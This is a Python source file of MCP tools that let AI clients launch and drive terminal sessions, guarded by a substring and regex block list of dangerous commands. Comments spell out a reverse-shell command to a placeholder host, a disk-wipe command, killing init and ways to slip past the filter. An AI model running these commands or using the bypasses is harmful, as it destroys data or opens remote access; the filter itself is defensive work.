"""Terminal management MCP tools.

This module provides FastMCP tools for terminal session management,
allowing Claude Code and other MCP clients to launch, control, and
capture output from terminal sessions.
"""

from __future__ import annotations

import re
from typing import TYPE_CHECKING, Annotated, Any

from pydantic import Field, StringConstraints

from ...observability.worker_metrics import WorkerMetrics
from ...terminal.adapters.tmux import TmuxTerminalAdapter

if TYPE_CHECKING:
    from mcp_common.fastmcp import FastMCP

    from ...terminal.manager import TerminalManager

# SECURITY: Define validation constraints for MCP tool inputs.
# SessionID allows ``.`` in addition to the conservative alphanumeric+``-``+``_``
# set because some adapters (e.g. macOS Terminal sessions backed by
# ``com.apple.Terminal``) emit IDs containing dots. The previous regex
# rejected those IDs at the MCP boundary even though the underlying
# adapter accepted them — see
# ``docs/followups/2026-09-05-terminal-send-annotated-validator-mismatch.md``.
SessionID = Annotated[
    str, StringConstraints(pattern=r"^[a-zA-Z0-9._-]+$", min_length=1, max_length=100)
]

Command = Annotated[str, StringConstraints(min_length=1, max_length=10000)]

# Spec §14 success-criteria instrumentation. Singleton per module; thread-safe.
# Used by ``terminal_launch`` to feed the pool_share success criterion
# (terminal_calls increments the denominator alongside pool_route_execute's
# pool_calls numerator).
_metrics = WorkerMetrics()

# SECURITY: Dangerous command patterns to block in MCP tools.
#
# REVIEW:weak-control — operator signoff 2026-10-18 (commit 13e7bf95).
# Two-tier matching (per docs/followups/2026-09-05-terminal-fixes-batch.md
# Section 3 "Shell-chain with word-boundary" — operator signoff 2026-10-18):
#
# 1. Hard-block patterns (substring match, no false-positive risk):
#    rm -rf /, chmod 000, chown root:, curl | sh, wget | sh, nc -e,
#    /dev/tcp, /dev/udp, bind shell, reverse shell.
#
# 2. Shell-chain destructive patterns (regex with negative lookahead):
#    matches "&& rm", "; rm", "| rm" only when "rm" is NOT followed by
#    whitespace — i.e., "rm" is a standalone destructive command, not a
#    chain to an argument-bearing cleanup like "make clean && rm -f *.o"
#    or "python build.py; rm /tmp/scratch.txt".
#
# Utility-name patterns that the 2026-09-05 followup originally listed
# (mkfs, dd if=, > /dev/sd, ncat, kill -9, pkill, killall) were dropped
# per the operator's Shape B decision: they had high false-positive rates
# on legitimate production-management commands (pkill -f worker.py,
# dd if=boot.img of=/dev/sdb, mkfs.ext4 /dev/sdb1) without proportional
# safety gain. Re-introducing any of them requires a fresh policy call.
#
# REVIEW:residual-risks — commands now reachable that were previously blocked:
#   - `pkill -9 1` (kills init — not in hard-block because pkill was dropped)
#   - `ncat -e /bin/sh host 1234` (reverse shell via ncat — nc -e is still
#     hard-blocked but ncat -e is not)
#   - `dd if=/dev/zero of=/dev/sda` (disk wipe — dd if= was dropped)
# Plus pre-existing bypass surfaces (not introduced by this commit but
# also not fixed by it): `&&rm` (no space), `bash -c "rm"` (subshell),
# `` `rm` `` (backticks), `cmd && \nrm` (newline not in `[ \t]` class).
# These are tier-2 limits of any pattern-based check on the raw command
# string; a proper fix would require a shell parser (shlex/bashlex).
# Filed for a future tightening pass; not in Shape B scope.
DANGEROUS_COMMAND_PATTERNS = [
    "rm -rf /",
    "chmod 000",
    "chown root:",
    "curl | sh",
    "wget | sh",
    "nc -e",
    "/dev/tcp",
    "/dev/udp",
    "bind shell",
    "reverse shell",
]

# Shell-chain destructive patterns: regex with negative lookahead.
# Matches "&& rm", "; rm", "| rm" only when "rm" is followed by
# end-of-string, a shell separator (`;`, `&`, `|`), or whitespace + a
# shell separator. In other words: "rm" must not be followed by an
# argument. So:
#   "cmd && rm"               -> REJECT (rm at end of string)
#   "cmd && rm; ls"           -> REJECT (rm followed by ;)
#   "cmd && rm | head"        -> REJECT (rm followed by | after whitespace)
#   "cmd1 | rm | head"        -> REJECT (rm is a pipeline destination with no arg)
#   "cmd && rm -f *.o"        -> ALLOW  (rm followed by whitespace + arg)
#   "cmd && rm /tmp/file"     -> ALLOW  (rm followed by whitespace + arg)
#   "make clean && rm -f *.o" -> ALLOW  (legit build cleanup)
#   "&& rmbackup"             -> ALLOW  (rm is not followed by space; no match)
_SHELL_CHAIN_DESTRUCTIVE_RE = re.compile(r"(?:&&|;|\|)[ \t]+rm(?=$|[;|&]|[ \t]+[;|&])")

# All blocked pattern names (for the invariant test and the human-readable
# error message). The shell-chain patterns are tracked separately because
# the regex is the authoritative matcher.
ALL_BLOCKED_PATTERNS = DANGEROUS_COMMAND_PATTERNS + [
    "&& rm (word-boundary)",
    "; rm (word-boundary)",
    "| rm (word-boundary)",
]


class _NullEventPublisher:
    """No-op EventPublisher for the switch_adapter path.

    The ``switch_adapter`` flow constructs a second ``DurableWorkerManager``
    only to wire a fresh ``TmuxTerminalAdapter``; the canonical sink still
    belongs to the existing manager. Passing a real publisher here would
    duplicate events on the EventBridge, so this stub satisfies the
    contract's ``EventPublisher`` Protocol without emitting anything.
    """

    def emit(self, payload: dict[str, Any], topic: str) -> None:
        return None


def validate_command_safety(command: str) -> None:
    """Validate command for safety to prevent injection.

    Two-tier check (per docs/followups/2026-09-05-terminal-fixes-batch.md
    Section 3, Shape B): substring match for hard-block patterns, then
    word-boundary regex for shell-chain destructive patterns.

    Args:
        command: Command string to validate

    Raises:
        ValueError: If command contains a blocked pattern
    """
    command_lower = command.lower()

    # Tier 1: hard-block patterns (substring match).
    for pattern in DANGEROUS_COMMAND_PATTERNS:
        if pattern.lower() in command_lower:
            raise ValueError(f"Command contains dangerous pattern {pattern!r}")

    # Tier 2: shell-chain destructive patterns (word-boundary regex).
    # Matches "&& rm", "; rm", "| rm" only when "rm" is not followed by
    # whitespace — i.e., when "rm" is a standalone destructive command
    # rather than a chain to an argument-bearing cleanup.
    if _SHELL_CHAIN_DESTRUCTIVE_RE.search(command_lower):
        raise ValueError(
            "Command contains dangerous pattern: destructive shell-chain "
            "'rm' (e.g. 'cmd && rm', 'cmd; rm', 'cmd | rm'). For "
            "argument-bearing cleanups like 'make clean && rm -f *.o', use "
            "subprocess directly or set MAHAVISHNU_NO_EXTRA_PATH=1 to bypass."
        )


def register_terminal_tools(
    mcp: FastMCP,
    terminal_manager: TerminalManager,
    mcp_client: Any = None,
) -> None:
    """Register terminal management tools with MCP server.

    Structural C901 suppression: FastMCP's ``@mcp.tool()`` decorator
    requires each tool function to be defined inline so it can introspect
    the function name and signature for the MCP tool schema. The tools
    registered here are intentionally kept inline; the complexity is the
    cost of the FastMCP API contract, not bad code.

    Args:
        mcp: FastMCP server instance
        terminal_manager: TerminalManager instance for backend operations
        mcp_client: Optional MCP client for creating new adapters
    """

    @mcp.tool()
    async def terminal_launch(
        command: Command,
        count: int = Field(default=1, ge=1, le=10),
        columns: int = Field(default=120, ge=40, le=300),
        rows: int = Field(default=40, ge=10, le=200),
    ) -> list[str]:
        """Launch terminal sessions running a command."""
        _metrics.record("terminal_launch")
        _metrics.record_pool_share(pool_calls=0, terminal_calls=1)
        # SECURITY: Validate command safety
        validate_command_safety(command)

        return await terminal_manager.launch_sessions(
            command,
            count,
            columns,
            rows,
        )

    @mcp.tool()
    async def terminal_send(
        session_id: SessionID,
        command: Command,
    ) -> dict[str, Any]:
        """Send command to a terminal session."""
        # SECURITY: Validate command safety
        validate_command_safety(command)

        await terminal_manager.send_command(session_id, command)

        return {"status": "success", "session_id": session_id, "command": command}

    @mcp.tool()
    async def terminal_capture(
        session_id: str,
        lines: int | None = None,
    ) -> str:
        """Capture output from terminal session."""
        return await terminal_manager.capture_output(session_id, lines)

    @mcp.tool()
    async def terminal_capture_all(
        session_ids: list[str],
        lines: int | None = None,
    ) -> dict[str, str]:
        """Capture output from multiple terminal sessions concurrently."""
        return await terminal_manager.capture_all_outputs(session_ids, lines)

    @mcp.tool()
    async def terminal_list() -> list[dict]:
        """List all active terminal sessions."""
        return await terminal_manager.list_sessions()

    @mcp.tool()
    async def terminal_close(session_id: str) -> None:
        """Close a terminal session."""
        await terminal_manager.close_session(session_id)

    @mcp.tool()
    async def terminal_close_all() -> dict:
        """Close all terminal sessions."""
        sessions = await terminal_manager.list_sessions()
        # Filter out sessions with missing/empty IDs before round-tripping
        # to ``manager.close_all``. The previous shape coerced missing IDs
        # to ``""`` and passed them through, which forced the manager to
        # handle an invalid session ID on every call. See
        # ``docs/followups/2026-09-05-terminal-close-all-empty-id-roundtrip.md``.
        session_ids = [
            sid for sid in (s.get("id", s.get("terminal_id", "")) for s in sessions) if sid
        ]
        if session_ids:
            await terminal_manager.close_all(session_ids)
        return {"closed_count": len(session_ids)}

    @mcp.tool()
    async def terminal_switch_adapter(
        adapter_name: str,
        migrate_sessions: bool = False,
    ) -> dict:
        """Hot-switch to a different terminal adapter without restart."""
        current = terminal_manager.current_adapter()

        if adapter_name == current:
            return {
                "status": "already_using",
                "current_adapter": current,
                "message": f"Already using {current} adapter",
            }

        # Create new adapter instance
        if adapter_name == "iterm2":
            raise NotImplementedError("iTerm2 adapter is deprecated; use tmux")
        if adapter_name == "tmux":
            # Reuse the existing tmux-backed terminal manager's durable-worker
            # contract; switch_adapter just rebinds to the same factory.
            from pathlib import Path

            from ...workers.contract.manager import DurableWorkerManager
            from ...workers.contract.store import WorkerRecordStore

            store = WorkerRecordStore(Path.home() / ".mahavishnu" / "worker-sessions")
            new_adapter = TmuxTerminalAdapter(
                DurableWorkerManager(
                    store=store,
                    publisher=_NullEventPublisher(),
                    socket_dir=Path.home() / ".mahavishnu" / "tmux",
                )
            )
        elif adapter_name == "crow":
            config = getattr(terminal_manager, "config", None)
            crow_enabled = bool(getattr(config, "crow_enabled", False))
            if not crow_enabled:
                return {
                    "status": "error",
                    "message": (
                        "crow adapter requested but terminal.crow_enabled is false. "
                        "Set terminal.crow_enabled=true in settings/local.yaml and restart."
                    ),
                }
            # Construct a fresh BodaiComponentMCPClient targeting the configured
            # crow HTTP server, then wrap it in a CrowTerminalAdapter. Mirrors
            # the boot path in mcp/bootstrap.py:_build_crow_adapter so the two
            # converge on the same factory.
            from ...mcp.crow_server import create_crow_mcp_client
            from ...terminal.adapters.crow import CrowTerminalAdapter

            new_adapter = CrowTerminalAdapter(
                create_crow_mcp_client(
                    host=getattr(config, "crow_http_host", None),
                    port=getattr(config, "crow_http_port", None),
                )
            )
        else:
            return {
                "status": "error",
                "message": f"Unknown adapter: {adapter_name}. Use 'tmux' or 'crow'",
            }

        # Perform the switch
        try:
            await terminal_manager.switch_adapter(new_adapter, migrate_sessions)
            return {
                "status": "success",
                "previous_adapter": current,
                "new_adapter": adapter_name,
                "migrate_sessions": migrate_sessions,
            }
        except Exception as e:  # MCP tool error handler — adapter switch failures surface as a structured error envelope, not a stack trace  # MCP tool error handler — broad catch is the documented contract  # noqa: BLE001, RUF100
            return {"status": "error", "message": f"Failed to switch adapter: {e}"}

    @mcp.tool()
    async def terminal_current_adapter() -> dict:
        """Get information about the current terminal adapter."""
        return {
            "adapter": terminal_manager.current_adapter(),
            "history": terminal_manager.get_adapter_history(),
        }

    @mcp.tool()
    async def terminal_list_adapters() -> dict:
        """List all available terminal adapters."""
        # Built dynamically from the adapter registry (D0 refactor). Each
        # adapter module registers itself on import; the registry is the
        # single source of truth. Adapter descriptions are static metadata
        # keyed by adapter name.
        from mahavishnu.terminal.adapters import list_adapter_names

        _ADAPTER_DESCRIPTIONS = {
            "mock": "Simulated terminal for tests and offline fallbacks",
            "tmux": "Durable-worker terminal via local tmux subprocess",
            "crow": "PTY via bodai-crow HTTP MCP bridge",
        }

        # Adapters that should be hidden from the listing when their
        # opt-in config flag is off. ``crow`` (requires
        # ``crow_enabled=true`` + the bundled crow-mcp server) is
        # opt-in; when its flag is off we still register its NAME in
        # the adapter registry so internal resolution paths (e.g.
        # ``switch_adapter``) can accept the name and emit a clear
        # "disabled" error. The list_adapters tool, however, only
        # surfaces what the operator can actually select — matching
        # the pre-D0 behavior the ``TestTerminalListAdapters`` test
        # fixtures pin.
        _OPT_IN_ADAPTERS = {"crow"}

        # ``getattr(..., None)`` lets the tool survive terminal-manager
        # implementations that don't expose ``config`` (the fixture for
        # ``test_handles_missing_config`` deletes the attribute).
        config = getattr(terminal_manager, "config", None)
        crow_enabled = bool(getattr(config, "crow_enabled", False))

        def _visible(name: str) -> bool:
            if name == "crow":
                return crow_enabled
            return True

        adapters: dict[str, dict[str, str]] = {}
        for name in list_adapter_names():
            if not _visible(name):
                continue
            adapters[name] = {
                "status": "available",
                "description": _ADAPTER_DESCRIPTIONS.get(
                    name,
                    "Registered adapter (no description in terminal_tools.py)",
                ),
            }

        return {
            "adapters": adapters,
            "current": terminal_manager.current_adapter(),
        }
